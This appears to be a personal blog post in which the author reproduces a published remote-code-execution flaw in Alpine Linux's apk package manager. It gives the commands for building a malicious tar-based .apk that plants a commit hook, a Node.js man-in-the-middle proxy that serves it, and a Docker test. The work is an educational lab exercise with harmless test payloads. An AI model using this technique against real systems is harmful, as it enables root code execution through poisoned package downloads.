---
layout: post
title: Testing RCE on Alpine Linux via APK
lang: en
description: Test a RCE vulnerability on APK + Alpine Linux
tags: docker alpine linux rce vulnerability apk
comments: true
--- 

I have been studying a little bit of security and one of the things I'm doing from time to time is reading CVE and trying to test and understand what is happening. Yesterday [Max Justicz](https://justi.cz/) published [Remote Code Execution in Alpine Linux](https://justi.cz/security/2018/09/13/alpine-apk-rce.html). He found an issues on `apk` which is the package manager for Alpine Linux which is super popular on docker images.

Max did a great job explaining the steps and the reasoning, but I wanted to try it myself. 


```
- Create a folder at /etc/apk/commit_hooks.d/, which doesn’t exist by default. Extracted folders are not suffixed with .apk-new.

- Create a symlink to /etc/apk/commit_hooks.d/x named anything – say, link. This gets expanded to be called link.apk-new but still points to /etc/apk/commit_hooks.d/x.

- Create a regular file named link (which will also be expanded to link.apk-new). This will write through the symlink and create a file at /etc/apk/commit_hooks.d/x.

- When apk realizes that the package’s hash doesn’t match the signed index, it will first unlink link.apk-new – but /etc/apk/commit_hooks.d/x will persist! It will then fail to unlink /etc/apk/commit_hooks.d/ with ENOTEMPTY because the directory now contains our payload.
```

The instructions seem simple but if you are not super familiar with how a tar file works, you may not understand it. On a tar file you can have multiple versions/files with the same name and you can extract one of them using `--occurrence` option. With this in mind, the instructions make a little bit more sense, so shall we try to create this file? 

First of all, let's create the directories:
```
sudo mkdir /etc/apk/commit_hooks.d/
mkdir folder_for_link
mkdir folder_for_real_file
```

Create the link:
```
/etc/apk/commit_hooks.d/x folder_for_link/magic
```

Create the real file on `folder_for_real_file/magic` with this content:
```
#!/bin/sh

echo "something" > /tmp/test-12346-YAY
echo "ha" > /testfileroot
```
(If it really works we should have a /tmp/test-123456-YAY file and one /testfileroot too)

Cool, now it seems we have almost everything we need! Let's create the apk with:
```
tar -zcvf bad-intention.apk /etc/apk/commit_hooks.d/ -C $PWD/folder_for_link/ magic -C $PWD/folder_for_real_file/ magic
```

Here we are adding all this 3 things in sequence to the tar file, you can check tar content with `t` option:
```
$ tar tvf bad-intention.apk
drwxr-xr-x root/root         0 2018-09-13 19:44 etc/apk/commit_hooks.d/
lrwxrwxrwx root/root         0 2018-09-13 19:37 magic -> /etc/apk/commit_hooks.d/x
-rwxrwxrwx root/root 954 2018-09-13 23:24 magic
```
(Pay attention on the order of this files: create directory commit_hooks.d, creation of link and creation of file)

What should be the behavior now? Since apk on alpine runs from `/` it will create the folder `/etc/apk/commit_hooks.k`, later it will extract the
link and to finish it will output the content of magic to the link which will be placed inside the `X` file. *Note*, I lost A LOT of time trying to see this behavior on `tar` it self, but it seems `tar` doesn't have this behavior and `apk` implements it's own extractor.

OK, now, we need to deliver this file when running the `apk add` inside docker. Here, I have updated /etc/hosts and pointed `dl-cdn.alpinelinux.org` to localhost. Using libraries `http-mitm-proxy http-proxy request` on node I have created a script to deliver the bad .apk when downloading something which has ltrace on url otherwise it will download the file and send to the docker.

```
var http = require('http'),
    httpProxy = require('http-proxy'),
    request = require('request'),
    fileSystem = require('fs'),
    path = require('path');

var proxy = httpProxy.createProxyServer({});

var server = http.createServer(function(req, res) {
  console.log('http://nl.alpinelinux.org' + req.url)
  if (req.url.indexOf('ltrace') > -1) {
    console.log("Trapped")
    var filePath = path.join(__dirname, 'bad-intention.apk');
    var stat = fileSystem.statSync(filePath);
    var readStream = fileSystem.createReadStream(filePath);
    readStream.pipe(res);
  } else {
      proxy = request('http://nl.alpinelinux.org' + req.url)
      proxy.on('response', function (a, b) {}).pipe(res);
  }
});

console.log("listening on port 80")
server.listen(80);
```

Building my docker with `docker build -t alpinetest --network=host --no-cache .`

```
FROM alpine:3.8

# RUN apk add python
RUN apk add ltrace

CMD "/bin/sh"
```
(If you are curious you can take a look on the test of the docker image even if it failed to build and see your files are really inside the correct places. Use `docker commit CONTAINER_ID` and `docker run -it SHA256_STRING sh`.)

This returned "The command '/bin/sh -c apk add ltrace' returned a non-zero code: 1". This happened because `apk` verifies the signature or the apk and try to clean up the files, but it is not able to since `/etc/apk/commit_hooks.k` contains a file. How to do some magic to make the apk return exit code 0? Max has found one (or two) ways of doing this. 

I still need to study what exactly the python script does to update the exit code but I have tested and it really works, as a quick test you can add `RUN apk add python` and update `folder_for_real_file/magic` to call his python code.

I know this may sound simple, but it took me a while to figure out all the tiny details. If you find any mistake I made, or want to say something, drop me a line! 

Matheus